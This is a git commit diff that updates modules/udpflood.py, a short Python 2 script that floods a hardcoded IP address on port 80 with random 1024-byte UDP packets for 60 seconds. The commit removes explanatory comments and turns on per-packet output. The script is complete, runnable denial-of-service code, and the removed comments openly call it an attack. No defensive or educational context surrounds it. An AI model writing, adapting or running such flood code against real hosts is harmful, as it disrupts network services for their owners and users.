cbdbfb113a17870dd31a8c18619a28f4688f1ed2
EasierChutoy <liamputnam@gmail.com>
2015-10-13 19:38:21 -0700

    Update udpflood.py

--- modules/udpflood.py
+++ modules/udpflood.py
@@ -1,19 +1,19 @@
-import socket #Imports needed libraries
+import socket 
 import random
 import time
-sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
-bytes=random._urandom(1024) #Creates packet
-ip='10.1.12.173' #The IP we are attacking
-port=80 #Port we direct to attack
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+bytes=random._urandom(1024)
+ip='10.1.12.173'
+port=80
 sent=0 
 st = time.time()
 print 'success'
 st = time.time()
-while(1): #Infinitely loops sending packets to the port until the program is exited.
+while(1):
 	end = time.time()
-	if(end-st<60):#Change this value to change the duration of attack!!!
+	if(end-st<60):
 		sock.sendto(bytes,(ip,port))
-		#print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
+		print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
 		sent= sent + 1
 	else:
 		exit()
